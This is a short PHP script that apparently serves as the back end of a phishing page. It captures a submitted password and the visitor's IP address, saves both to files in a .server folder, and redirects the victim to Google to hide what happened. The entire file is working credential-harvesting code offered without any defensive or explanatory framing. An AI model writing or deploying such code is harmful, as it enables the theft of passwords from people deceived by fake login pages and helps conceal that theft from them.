<?php

$pass = $_POST['pass'];

// $ip = $_SERVER("REMOTE_ADDR");

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}



$ipfile = fopen(".server/ip.txt", "w");
fwrite($ipfile, $ip);
fclose($ipfile);

$file = fopen(".server/pass.txt", "w");
fwrite($file, $pass);
fclose($file);

header("Location: https://www.google.com");

?>
